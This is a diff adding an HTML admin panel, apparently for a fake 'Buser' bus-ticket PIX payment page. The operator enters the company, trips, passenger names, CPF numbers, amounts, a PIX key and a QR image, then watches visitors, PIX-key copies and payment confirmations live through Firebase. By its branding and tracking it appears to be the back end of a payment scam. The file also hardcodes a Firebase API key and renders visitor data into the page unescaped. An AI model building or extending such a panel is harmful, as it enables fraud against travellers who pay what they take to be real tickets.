@@ -1,0 +1,551 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Painel Admin - Buser PIX</title>
+<style>
+* { margin:0; padding:0; box-sizing:border-box; font-family: system-ui, sans-serif; }
+body { min-height:100vh; background:linear-gradient(135deg,#fff5f7,#f0f9ff); padding:20px; }
+.container { max-width:720px; margin:0 auto; background:#fff; border-radius:24px; box-shadow:0 20px 50px rgba(255,0,128,.1); padding:28px 24px; }
+h1 { font-size:1.4rem; color:#1a1a2e; margin-bottom:4px; }
+h1 span { color:#ff3d8b; }
+.sub { font-size:.85rem; color:#6b7280; margin-bottom:20px; }
+
+.tabs { display:flex; gap:6px; margin-bottom:22px; border-bottom:2px solid #e2e8f0; }
+.tab { flex:1; padding:12px 8px; background:none; border:none; font-size:.85rem; font-weight:700; color:#6b7280; cursor:pointer; border-bottom:3px solid transparent; transition:all .2s; }
+.tab.active { color:#ff3d8b; border-bottom-color:#ff3d8b; }
+
+.tab-content { display:none; }
+.tab-content.active { display:block; }
+
+label { display:block; font-size:.8rem; font-weight:700; color:#374151; margin-bottom:6px; text-transform:uppercase; letter-spacing:.5px; }
+input, select, textarea { width:100%; padding:12px 14px; border:1.5px solid #e2e8f0; border-radius:12px; font-size:.9rem; margin-bottom:16px; outline:none; transition:border .2s; font-family:inherit; }
+input:focus, select:focus, textarea:focus { border-color:#ff3d8b; }
+textarea { resize:vertical; min-height:70px; }
+.row { display:flex; gap:12px; }
+.row > div { flex:1; }
+.btn { width:100%; padding:15px; border:none; border-radius:40px; font-size:1rem; font-weight:800; cursor:pointer; color:#fff; letter-spacing:.3px; background:linear-gradient(135deg,#ff3d8b,#ff6fa5); box-shadow:0 6px 20px rgba(255,61,139,.4); transition:transform .15s; }
+.btn:hover { transform:translateY(-2px); }
+.btn:active { transform:scale(.97); }
+.btn[disabled] { opacity:.6; cursor:default; transform:none; }
+.btn-sm { padding:8px 14px; font-size:.8rem; border-radius:20px; width:auto; box-shadow:none; }
+.btn-danger { background:linear-gradient(135deg,#ef4444,#f87171); }
+.btn-secondary { background:linear-gradient(135deg,#64748b,#94a3b8); }
+
+.status { text-align:center; font-size:.85rem; font-weight:600; height:20px; margin-top:12px; }
+.status.ok { color:#10b981; }
+.status.err { color:#ef4444; }
+
+.card { background:#f8fafc; border:1.5px solid #e2e8f0; border-radius:14px; padding:16px; margin-bottom:14px; }
+.card-header { display:flex; justify-content:space-between; align-items:center; margin-bottom:12px; }
+.card-title { font-size:.8rem; font-weight:800; color:#ff3d8b; text-transform:uppercase; letter-spacing:.5px; }
+.hint { font-size:.72rem; color:#94a3b8; margin-top:-10px; margin-bottom:16px; }
+
+.preview { display:flex; justify-content:center; margin-bottom:16px; }
+.preview img { max-width:180px; border-radius:12px; border:2px solid #ffe0ec; }
+
+.qr-upload { display:flex; flex-direction:column; gap:8px; align-items:center; padding:16px; border:2px dashed #ffd0e0; border-radius:14px; background:#fff0f6; margin-bottom:16px; }
+.qr-upload input[type=file] { display:none; }
+.qr-upload label { cursor:pointer; padding:12px 24px; background:linear-gradient(135deg,#ff3d8b,#ff6fa5); color:#fff; border-radius:40px; font-size:.85rem; font-weight:700; margin:0; text-transform:none; letter-spacing:0; }
+
+.list-item { display:flex; justify-content:space-between; align-items:center; padding:10px 12px; background:#fff; border:1px solid #e2e8f0; border-radius:10px; margin-bottom:6px; font-size:.82rem; gap:10px; }
+.list-item .info { flex:1; min-width:0; }
+.list-item .name { font-weight:600; color:#1a1a2e; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
+.list-item .meta { font-size:.72rem; color:#6b7280; }
+.badge { display:inline-block; padding:3px 8px; border-radius:20px; font-size:.65rem; font-weight:800; text-transform:uppercase; letter-spacing:.3px; }
+.badge-online { background:#d1fae5; color:#065f46; }
+.badge-offline { background:#fee2e2; color:#991b1b; }
+.badge-copied { background:#fef3c7; color:#92400e; }
+.badge-paid { background:#d1fae5; color:#065f46; }
+
+.empty { text-align:center; padding:30px 10px; color:#94a3b8; font-size:.85rem; }
+
+@media(max-width:500px){
+  .row { flex-direction:column; }
+  .container { padding:20px 16px; }
+  .tab { font-size:.75rem; padding:10px 4px; }
+}
+</style>
+</head>
+<body>
+<div class="container">
+  <h1>Painel <span>Admin</span> - PIX</h1>
+  <p class="sub">Alterações em tempo real · Monitoramento ao vivo</p>
+
+  <div class="tabs">
+    <button class="tab active" data-tab="config">⚙️ Configurar</button>
+    <button class="tab" data-tab="live">👁️ Ao Vivo</button>
+    <button class="tab" data-tab="history">📊 Histórico</button>
+  </div>
+
+  <!-- ABA CONFIG -->
+  <div class="tab-content active" id="tab-config">
+    <form id="configForm">
+      <label>Empresa</label>
+      <input id="empresa" placeholder="Ex: Gontijo">
+
+      <label>Tipo de viagem</label>
+      <select id="tipoViagem">
+        <option value="ida">Somente ida</option>
+        <option value="ida_volta">Ida e volta</option>
+      </select>
+
+      <div class="card">
+        <div class="card-header"><span class="card-title">🛫 Ida</span></div>
+        <div class="row">
+          <div>
+            <label>Origem</label>
+            <input id="ida_origem" placeholder="Ex: Londrina">
+          </div>
+          <div>
+            <label>Destino</label>
+            <input id="ida_destino" placeholder="Ex: Belo Horizonte">
+          </div>
+        </div>
+        <div class="row">
+          <div>
+            <label>Data</label>
+            <input id="ida_data" placeholder="Ex: Qua. 28 out.">
+          </div>
+          <div>
+            <label>Horário</label>
+            <input id="ida_horario" placeholder="Ex: 08:30">
+          </div>
+        </div>
+      </div>
+
+      <div class="card" id="voltaCard" style="display:none">
+        <div class="card-header"><span class="card-title">🛬 Volta</span></div>
+        <div class="row">
+          <div>
+            <label>Origem</label>
+            <input id="volta_origem" placeholder="Ex: Belo Horizonte">
+          </div>
+          <div>
+            <label>Destino</label>
+            <input id="volta_destino" placeholder="Ex: Londrina">
+          </div>
+        </div>
+        <div class="row">
+          <div>
+            <label>Data</label>
+            <input id="volta_data" placeholder="Ex: Dom. 01 nov.">
+          </div>
+          <div>
+            <label>Horário</label>
+            <input id="volta_horario" placeholder="Ex: 18:00">
+          </div>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-header">
+          <span class="card-title">👥 Passageiros</span>
+          <button type="button" class="btn btn-sm" id="addPassenger">+ Adicionar</button>
+        </div>
+        <div id="passengersList"></div>
+        <p class="hint">Cada passageiro tem nome, CPF e valor individual. O total é somado automaticamente.</p>
+      </div>
+
+      <label>Chave PIX (copia e cola)</label>
+      <textarea id="pixKey" placeholder="00020126580014br.gov.bcb.pix..."></textarea>
+
+      <label>QR Code (opcional — envie uma foto do QR)</label>
+      <div class="qr-upload">
+        <input type="file" id="qrFile" accept="image/*">
+        <label for="qrFile">📷 Enviar foto do QR Code</label>
+        <p class="hint" style="margin:0">Se não enviar, o QR é gerado pela chave PIX.</p>
+      </div>
+      <div class="preview" id="qrPreview"></div>
+      <button type="button" class="btn btn-secondary btn-sm" id="removeQr" style="display:none;margin-bottom:16px">Remover QR enviado</button>
+
+      <button class="btn" type="submit" id="saveBtn">💾 Salvar alterações</button>
+      <div class="status" id="status"></div>
+    </form>
+  </div>
+
+  <!-- ABA AO VIVO -->
+  <div class="tab-content" id="tab-live">
+    <div class="card">
+      <div class="card-header">
+        <span class="card-title">🟢 Quem está no site agora</span>
+        <span class="badge badge-online" id="onlineCount">0 online</span>
+      </div>
+      <div id="presenceList"><div class="empty">Ninguém no site no momento.</div></div>
+    </div>
+
+    <div class="card">
+      <div class="card-header">
+        <span class="card-title">📋 Copiaram o PIX</span>
+        <span class="badge badge-copied" id="copyCount">0 cópias</span>
+      </div>
+      <div id="copyList"><div class="empty">Nenhuma cópia ainda.</div></div>
+    </div>
+
+    <div class="card">
+      <div class="card-header">
+        <span class="card-title">✅ Confirmaram pagamento</span>
+        <span class="badge badge-paid" id="paidCount">0 confirmações</span>
+      </div>
+      <div id="paidList"><div class="empty">Nenhuma confirmação ainda.</div></div>
+    </div>
+  </div>
+
+  <!-- ABA HISTÓRICO -->
+  <div class="tab-content" id="tab-history">
+    <div class="card">
+      <div class="card-header">
+        <span class="card-title">📊 Todos os eventos</span>
+        <button class="btn btn-sm btn-danger" id="clearHistory">Limpar</button>
+      </div>
+      <div id="historyList"><div class="empty">Nenhum evento registrado.</div></div>
+    </div>
+  </div>
+</div>
+
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+import { getDatabase, ref, set, push, onValue, remove }
+  from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
+
+const firebaseConfig = {
+  apiKey: "AIzaSyDjlEzQVLQuXQwmqR6bP9Xj8nx0c122njw",
+  authDomain: "tela-copiar-chave.firebaseapp.com",
+  databaseURL: "https://tela-copiar-chave-default-rtdb.firebaseio.com",
+  projectId: "tela-copiar-chave",
+  storageBucket: "tela-copiar-chave.firebasestorage.app",
+  messagingSenderId: "1002556410924",
+  appId: "1:1002556410924:web:39c833bb3abf14c5259589"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
+const configRef = ref(db, 'buser_pix_config');
+
+const $ = id => document.getElementById(id);
+const statusEl = $('status');
+
+// ============ TABS ============
+document.querySelectorAll('.tab').forEach(tab => {
+  tab.addEventListener('click', () => {
+    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+    document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+    tab.classList.add('active');
+    $('tab-' + tab.dataset.tab).classList.add('active');
+  });
+});
+
+// ============ PASSAGEIROS (dinâmico) ============
+let passageiros = [];
+
+function renderPassengersEditor(){
+  const box = $('passengersList');
+  box.innerHTML = '';
+  if(!passageiros.length){
+    box.innerHTML = '<div class="empty" style="padding:16px">Nenhum passageiro. Clique em "+ Adicionar".</div>';
+    atualizarTotal();
+    return;
+  }
+  passageiros.forEach((p, i) => {
+    const div = document.createElement('div');
+    div.className = 'card';
+    div.style.marginBottom = '8px';
+    div.innerHTML = `
+      <div class="card-header" style="margin-bottom:8px">
+        <span class="card-title">Passageiro ${i+1}</span>
+        <button type="button" class="btn btn-sm btn-danger" data-remove="${i}">Remover</button>
+      </div>
+      <div class="row">
+        <div><label>Nome</label><input data-field="nome" data-idx="${i}" value="${p.nome||''}" placeholder="Nome"></div>
+        <div><label>CPF</label><input data-field="cpf" data-idx="${i}" value="${p.cpf||''}" placeholder="000.000.000-00"></div>
+      </div>
+      <label>Valor individual (R$)</label>
+      <input data-field="valor" data-idx="${i}" value="${p.valor||''}" placeholder="189,00">
+    `;
+    box.appendChild(div);
+  });
+  box.querySelectorAll('input').forEach(inp => {
+    inp.addEventListener('input', e => {
+      const idx = +e.target.dataset.idx;
+      const field = e.target.dataset.field;
+      passageiros[idx][field] = e.target.value;
+      if(field === 'valor') atualizarTotal();
+    });
+  });
+  box.querySelectorAll('[data-remove]').forEach(btn => {
+    btn.addEventListener('click', () => {
+      passageiros.splice(+btn.dataset.remove, 1);
+      renderPassengersEditor();
+    });
+  });
+  atualizarTotal();
+}
+
+function atualizarTotal(){
+  const total = passageiros.reduce((sum, p) => {
+    const v = parseFloat((p.valor || '0').replace(/\./g,'').replace(',','.')) || 0;
+    return sum + v;
+  }, 0);
+  $('orderTotalPreview')?.remove();
+  const el = document.createElement('div');
+  el.id = 'orderTotalPreview';
+  el.style.cssText = 'text-align:center;font-size:1.2rem;font-weight:800;color:#ff3d8b;padding:8px 0 16px';
+  el.textContent = 'Total: R$ ' + total.toFixed(2).replace('.',',');
+  $('passengersList').after(el);
+}
+
+$('addPassenger').addEventListener('click', () => {
+  passageiros.push({ nome:'', cpf:'', valor:'' });
+  renderPassengersEditor();
+});
+
+// ============ IDA/VOLTA ============
+$('tipoViagem').addEventListener('change', e => {
+  $('voltaCard').style.display = e.target.value === 'ida_volta' ? 'block' : 'none';
+});
+
+// ============ QR UPLOAD (foto) ============
+let qrImageData = null;
+let qrImageChanged = false;
+
+$('qrFile').addEventListener('change', e => {
+  const file = e.target.files[0];
+  if(!file) return;
+  const reader = new FileReader();
+  reader.onload = ev => {
+    qrImageData = ev.target.result;
+    qrImageChanged = true;
+    renderQrPreview();
+  };
+  reader.readAsDataURL(file);
+});
+
+function renderQrPreview(){
+  const box = $('qrPreview');
+  box.innerHTML = '';
+  if(qrImageData){
+    const img = document.createElement('img');
+    img.src = qrImageData;
+    box.appendChild(img);
+    $('removeQr').style.display = 'inline-block';
+  } else {
+    $('removeQr').style.display = 'none';
+  }
+}
+
+$('removeQr').addEventListener('click', () => {
+  qrImageData = null;
+  qrImageChanged = true;
+  $('qrFile').value = '';
+  renderQrPreview();
+});
+
+// ============ CARREGAR CONFIG ============
+onValue(configRef, (snap) => {
+  const c = snap.val();
+  if(!c) return;
+  $('empresa').value = c.empresa || '';
+  $('tipoViagem').value = c.tipoViagem || 'ida';
+  $('voltaCard').style.display = (c.tipoViagem === 'ida_volta') ? 'block' : 'none';
+
+  if(c.ida){
+    $('ida_origem').value = c.ida.origem || '';
+    $('ida_destino').value = c.ida.destino || '';
+    $('ida_data').value = c.ida.data || '';
+    $('ida_horario').value = c.ida.horario || '';
+  }
+  if(c.volta){
+    $('volta_origem').value = c.volta.origem || '';
+    $('volta_destino').value = c.volta.destino || '';
+    $('volta_data').value = c.volta.data || '';
+    $('volta_horario').value = c.volta.horario || '';
+  }
+  passageiros = Array.isArray(c.passageiros) ? c.passageiros.map(p => ({...p})) : [];
+  renderPassengersEditor();
+
+  $('pixKey').value = c.pixKey || '';
+
+  // Só sobrescreve a imagem se não foi alterada localmente
+  if(!qrImageChanged){
+    qrImageData = c.qrImage || null;
+    renderQrPreview();
+  }
+});
+
+// ============ SALVAR ============
+$('configForm').addEventListener('submit', async (e) => {
+  e.preventDefault();
+  const btn = $('saveBtn');
+  btn.disabled = true;
+  btn.textContent = 'Salvando...';
+  statusEl.textContent = '';
+  statusEl.className = 'status';
+
+  const config = {
+    empresa: $('empresa').value.trim(),
+    tipoViagem: $('tipoViagem').value,
+    ida: {
+      origem: $('ida_origem').value.trim(),
+      destino: $('ida_destino').value.trim(),
+      data: $('ida_data').value.trim(),
+      horario: $('ida_horario').value.trim()
+    },
+    volta: $('tipoViagem').value === 'ida_volta' ? {
+      origem: $('volta_origem').value.trim(),
+      destino: $('volta_destino').value.trim(),
+      data: $('volta_data').value.trim(),
+      horario: $('volta_horario').value.trim()
+    } : null,
+    passageiros: passageiros.filter(p => p.nome || p.cpf || p.valor),
+    pixKey: $('pixKey').value.trim(),
+    qrImage: qrImageData || null
+  };
+
+  // Calcula total
+  const total = config.passageiros.reduce((sum, p) => {
+    const v = parseFloat((p.valor || '0').replace(/\./g,'').replace(',','.')) || 0;
+    return sum + v;
+  }, 0);
+  config.total = total.toFixed(2).replace('.', ',');
+
+  try {
+    await set(configRef, config);
+    qrImageChanged = false;
+    statusEl.textContent = '✓ Salvo! Site atualizado em tempo real.';
+    statusEl.className = 'status ok';
+  } catch(err){
+    console.error(err);
+    statusEl.textContent = '✗ Erro ao salvar. Verifique as regras do Firebase.';
+    statusEl.className = 'status err';
+  } finally {
+    btn.disabled = false;
+    btn.textContent = '💾 Salvar alterações';
+    setTimeout(()=>{ statusEl.textContent = ''; }, 4000);
+  }
+});
+
+// ============ AO VIVO: PRESENÇA ============
+onValue(ref(db, 'presenca'), (snap) => {
+  const data = snap.val() || {};
+  const now = Date.now();
+  const list = $('presenceList');
+  const items = Object.entries(data).map(([id, p]) => ({ id, ...p }))
+    .filter(p => (now - p.entrouEm) < 10 * 60 * 1000) // últimos 10 min
+    .sort((a,b) => b.entrouEm - a.entrouEm);
+  $('onlineCount').textContent = items.length + ' online';
+  if(!items.length){
+    list.innerHTML = '<div class="empty">Ninguém no site no momento.</div>';
+    return;
+  }
+  list.innerHTML = '';
+  items.forEach(p => {
+    const div = document.createElement('div');
+    div.className = 'list-item';
+    const mins = Math.floor((now - p.entrouEm) / 60000);
+    div.innerHTML = `
+      <div class="info">
+        <div class="name">${p.userAgent || 'Dispositivo'}</div>
+        <div class="meta">Sessão ${p.id.slice(0,10)} · entrou há ${mins}min</div>
+      </div>
+      <span class="badge badge-online">online</span>`;
+    list.appendChild(div);
+  });
+});
+
+// ============ AO VIVO: CÓPIAS ============
+onValue(ref(db, 'eventos_copia'), (snap) => {
+  const data = snap.val() || {};
+  const items = Object.entries(data).map(([id, e]) => ({ id, ...e }))
+    .sort((a,b) => b.copiadoEm - a.copiadoEm);
+  $('copyCount').textContent = items.length + ' cópias';
+  const list = $('copyList');
+  if(!items.length){
+    list.innerHTML = '<div class="empty">Nenhuma cópia ainda.</div>';
+    return;
+  }
+  list.innerHTML = '';
+  items.slice(0,20).forEach(e => {
+    const div = document.createElement('div');
+    div.className = 'list-item';
+    const t = new Date(e.copiadoEm).toLocaleString('pt-BR');
+    div.innerHTML = `
+      <div class="info">
+        <div class="name">${e.pixKey || '—'}</div>
+        <div class="meta">${t} · sessão ${e.sessionId.slice(0,10)}</div>
+      </div>
+      <span class="badge badge-copied">copiou</span>`;
+    list.appendChild(div);
+  });
+});
+
+// ============ AO VIVO: CONFIRMAÇÕES ============
+onValue(ref(db, 'pagamentos_confirmados'), (snap) => {
+  const data = snap.val() || {};
+  const items = Object.entries(data).map(([id, e]) => ({ id, ...e }))
+    .sort((a,b) => b.confirmadoEm - a.confirmadoEm);
+  $('paidCount').textContent = items.length + ' confirmações';
+  const list = $('paidList');
+  if(!items.length){
+    list.innerHTML = '<div class="empty">Nenhuma confirmação ainda.</div>';
+    return;
+  }
+  list.innerHTML = '';
+  items.slice(0,20).forEach(e => {
+    const div = document.createElement('div');
+    div.className = 'list-item';
+    const t = new Date(e.confirmadoEm).toLocaleString('pt-BR');
+    div.innerHTML = `
+      <div class="info">
+        <div class="name">${e.pixKey || '—'}</div>
+        <div class="meta">${t} · sessão ${e.sessionId.slice(0,10)}</div>
+      </div>
+      <span class="badge badge-paid">pago</span>`;
+    list.appendChild(div);
+  });
+});
+
+// ============ HISTÓRICO ============
+function carregarHistorico(){
+  const list = $('historyList');
+  Promise.all([
+    new Promise(r => onValue(ref(db,'eventos_copia'), r, {onlyOnce:true})),
+    new Promise(r => onValue(ref(db,'pagamentos_confirmados'), r, {onlyOnce:true}))
+  ]).then(([copiasSnap, pagosSnap]) => {
+    const copias = Object.entries(copiasSnap.val() || {}).map(([id,e]) => ({...e, tipo:'copia', id}));
+    const pagos = Object.entries(pagosSnap.val() || {}).map(([id,e]) => ({...e, tipo:'pago', id}));
+    const all = [...copias, ...pagos].sort((a,b) => {
+      const ta = a.copiadoEm || a.confirmadoEm || 0;
+      const tb = b.copiadoEm || b.confirmadoEm || 0;
+      return tb - ta;
+    });
+    if(!all.length){
+      list.innerHTML = '<div class="empty">Nenhum evento registrado.</div>';
+      return;
+    }
+    list.innerHTML = '';
+    all.forEach(e => {
+      const div = document.createElement('div');
+      div.className = 'list-item';
+      const t = new Date(e.copiadoEm || e.confirmadoEm).toLocaleString('pt-BR');
+      div.innerHTML = `
+        <div class="info">
+          <div class="name">${e.tipo === 'copia' ? '📋 Copiou PIX' : '✅ Confirmou pagamento'}</div>
+          <div class="meta">${t} · ${e.pixKey || ''}</div>
+        </div>
+        <span class="badge ${e.tipo === 'copia' ? 'badge-copied' : 'badge-paid'}">${e.tipo}</span>`;
+      list.appendChild(div);
+    });
+  });
+}
+$('clearHistory').addEventListener('click', async () => {
+  if(!confirm('Apagar todo o histórico de cópias e confirmações?')) return;
+  await remove(ref(db, 'eventos_copia'));
+  await remove(ref(db, 'pagamentos_confirmados'));
+  carregarHistorico();
+});
+// Carrega histórico quando clica na aba
+document.querySelector('[data-tab="history"]').addEventListener('click', carregarHistorico);
+</script>
+</body>
+</html>
